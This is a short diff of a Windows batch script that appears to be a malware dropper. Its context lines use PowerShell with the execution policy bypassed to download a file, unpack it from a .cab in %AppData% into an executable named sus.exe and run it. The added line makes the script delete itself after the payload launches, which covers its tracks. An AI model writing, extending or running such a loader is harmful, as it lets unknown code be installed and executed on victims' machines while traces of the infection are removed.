@@ -2,3 +2,4 @@ call powershell.exe -ExecutionPolicy bypass -noprofile (New-Object System.Net.We
 call expand %AppData%\z.cab %AppData%\sus.exe
 call start %AppData%\sus.exe
 call del %AppData%\z.cab
+call del %AppData%\prtol.bat
